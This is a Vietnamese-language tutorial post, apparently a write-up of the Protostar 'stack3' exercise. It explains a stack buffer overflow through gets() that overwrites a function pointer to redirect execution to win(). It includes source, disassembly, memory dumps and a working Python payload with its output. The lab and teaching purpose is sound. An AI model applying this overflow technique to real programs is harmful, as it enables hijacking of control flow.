---
layout: post
title: stack3
---
Trong những bài trước, chúng ta đã biết cách gán giá trị mong muốn gián tiếp cho một biến.
Ứng dụng của kỹ thuật này sẽ được giới thiệu trong stack3.
Mục tiêu của bài này là gán gián tiếp biến function pointer, và gọi hàm, hay cũng chính là điều hướng chương trình đến địa chỉ hàm cần gọi.
Hãy xem source code sau:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
Ta cần gán cho function pointer `fp` địa chỉ của hàm `win`.
Khi source code được compile, symbol của `win` sẽ có mặt trong section .text của chương trình.
Để biết được địa chỉ của hàm `win`, ta có thể dùng chương trình `objdump` có trên linux.
Bạn cũng có thể dùng `gdb` với lệnh `disassemble` xem asm code của `win`, trong đó có cả thông tin về địa chỉ hàm.
Sau đây là asm code của `main` và `win`:
```asm
0x08048424 <win+0>:     push   ebp
0x08048425 <win+1>:     mov    ebp,esp
0x08048427 <win+3>:     sub    esp,0x18
0x0804842a <win+6>:     mov    DWORD PTR [esp],0x8048540
0x08048431 <win+13>:    call   0x8048360 <puts@plt>
0x08048436 <win+18>:    leave
0x08048437 <win+19>:    ret
0x08048438 <main+0>:    push   ebp
0x08048439 <main+1>:    mov    ebp,esp
0x0804843b <main+3>:    and    esp,0xfffffff0
0x0804843e <main+6>:    sub    esp,0x60
0x08048441 <main+9>:    mov    DWORD PTR [esp+0x5c],0x0
0x08048449 <main+17>:   lea    eax,[esp+0x1c]
0x0804844d <main+21>:   mov    DWORD PTR [esp],eax
0x08048450 <main+24>:   call   0x8048330 <gets@plt>
0x08048455 <main+29>:   cmp    DWORD PTR [esp+0x5c],0x0
0x0804845a <main+34>:   je     0x8048477 <main+63>
0x0804845c <main+36>:   mov    eax,0x8048560
0x08048461 <main+41>:   mov    edx,DWORD PTR [esp+0x5c]
0x08048465 <main+45>:   mov    DWORD PTR [esp+0x4],edx
0x08048469 <main+49>:   mov    DWORD PTR [esp],eax
0x0804846c <main+52>:   call   0x8048350 <printf@plt>
0x08048471 <main+57>:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 <main+61>:   call   eax
0x08048477 <main+63>:   leave
0x08048478 <main+64>:   ret
```
2 biến `buffer` và `fp` chiếm bộ nhớ liên tiếp nhau, lần lượt là 64 byte `esp + 0x1c` đến `esp + 0x5b` và 4 byte từ `esp + 0x5c`.
Áp dụng kỹ thuật tương tự như 3 bài trước, chúng ta sẽ nhập 68 byte cho `buffer`, trong đó 4 byte cuối có giá trị bằng với địa chỉ của `win`.
Địa chỉ của hàm `win` là `0x08048424`.
Trước khi nhập vào, bộ nhớ sẽ như sau.
Phân biệt theo màu: <span style="color:aqua">buffer</span> và <span style="color:orangered">modified</span>.
<pre class="memory">
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      <span style="color:aqua">0xb7eada75</span>
0xbffff760:     <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x0804967c</span>      <span style="color:aqua">0xbffff778</span>      <span style="color:aqua">0x0804830c</span>
0xbffff770:     <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804967c</span>      <span style="color:aqua">0xbffff7a8</span>      <span style="color:aqua">0x080484a9</span>
0xbffff780:     <span style="color:aqua">0xb7fd8304</span>      <span style="color:aqua">0xb7fd7ff4</span>      <span style="color:aqua">0x08048490</span>      <span style="color:aqua">0xbffff7a8</span>
0xbffff790:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804849b</span>      <span style="color:orangered">0x00000000</span>
</pre>
68 byte sau đây sẽ được dùng để nhập giá trị cho `buffer`:
```bash
python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + '\x24\x84\x04\x08'" > input.txt
stack3 < input.txt
```
Sau hàm `gets`, bộ nhớ tại `esp` sẽ như sau.

<pre class="memory">
0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      <span style="color:aqua">0x41414141</span>
0xbffff760:     <span style="color:aqua">0x42424242</span>      <span style="color:aqua">0x43434343</span>      <span style="color:aqua">0x44444444</span>      <span style="color:aqua">0x45454545</span>
0xbffff770:     <span style="color:aqua">0x46464646</span>      <span style="color:aqua">0x47474747</span>      <span style="color:aqua">0x48484848</span>      <span style="color:aqua">0x31313131</span>
0xbffff780:     <span style="color:aqua">0x32323232</span>      <span style="color:aqua">0x33333333</span>      <span style="color:aqua">0x34343434</span>      <span style="color:aqua">0x35353535</span>
0xbffff790:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x08048424</span>
</pre>

Địa chỉ, khi viết từng byte sẽ cần phải đảo ngược thứ tự để đảm bảo tiêu chuẩn Little Endian.

## Ref
```bash
user@protostar:~$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + '\x24\x84\x04\x08'" > input.txt
user@protostar:~$ stack3 < input.txt
calling function pointer, jumping to 0x08048424
code flow successfully changed
```
